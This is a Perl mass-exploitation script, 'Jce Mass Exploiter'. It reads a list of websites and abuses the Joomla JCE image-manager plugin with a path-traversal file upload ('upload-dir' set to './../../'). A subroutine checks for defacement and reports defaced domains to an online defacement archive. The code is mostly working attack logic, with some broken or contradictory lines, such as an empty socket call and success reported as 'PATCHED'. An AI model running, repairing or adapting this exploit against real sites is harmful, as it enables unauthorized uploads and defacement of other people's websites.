#!/usr/bin/perl

#Jce Mass Exploiter Coded By Dr.S4mom
# Greetz To Moroccan Hackers

use Term::ANSIColor;
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Request::Common qw(POST);
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.4) Gecko/20030624 Netscape/7.1 (ax)");
$ua->timeout (10);
system('title Jce Mass Exploiter by Dr.S4mom');
print "Jce Mass Exploiter\n";
print "Coded by Dr.S4mom\n";
print "Hacker Make Tools No Tools Makes Hacker\n";
print "websites list:";
my $list=<STDIN>;
chomp($list);
  open (THETARGET, "<$list") || die ">>>Can't open the Website list<<< !";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;

foreach $site(@TARGETS){

chomp $site;
if($site !~ /http:\/\//) { $site = "http://$site/"; };
$exploiturl="/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20";
print "wait upload  $site\n";

$vulnurl=$site.$exploiturl;
$res = $ua->get($vulnurl)->content;
if ($res =~ m/No function call specified!/i){
    open(save, '>>/result/list.txt'); 

print "\n[Uploading]";
my $res = $ua->post($vulnurl,
    Content_Type => 'form-data',
    Content => [
        'upload-dir' => './../../',
        'upload-overwrite' => 0,
        'Filedata' => ["ke.gif"],
        'action' => 'upload'

        ]
    )->decoded_content;
if ($res =~ m/"error":false/i){

}else{
print " ......... ";
print color('bold white');
print "[";
print color('reset');
print color('bold green');
print "PATCHED";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');
}

$remote = IO::Socket::INET->new(
        Proto=>
        PeerAddr=>"$site",
        PeerPort=>
        Timeout=>
        );
$def= "$site/ctr.gif";
print colored ("[+]Exploited",'white on_red'),"\n";
print "$site/ke.gif\n";
}else{
print colored (">>Exploit Failed<<",'white on_blue'),"\n";
}
}
sub zonpost{
$req = HTTP::Request->new(GET=>$link);
$useragent = LWP::UserAgent->new();
$response = $useragent->request($req);
$ar = $response->content;
if ($ar =~ /Hacked|Dr.S4mom/){

				$dmn= $link;
				$def="Dr.S4mom";
				$zn="http://aljyyosh.org/single.php";
				$lwp=LWP::UserAgent->new;
				$res=$lwp  -> post($zn,[
				'defacer'     => $def,
				'domain1'   => $dmn,
				'hackmode' => '15',
				'reason'       => '1',
				'submit'       => 'Send',
				]);
				if ($res->content =~ /color="red">(.*)<\/font><\/li>/) {
				print colored ("[-]submit $1",'white on_green'),"\n";
				}
				else
				{
				print colored ("[-]Error",'black on_white'),"\n";
				}
				     }else{
						print" Not Defaced !! \n";

}
}
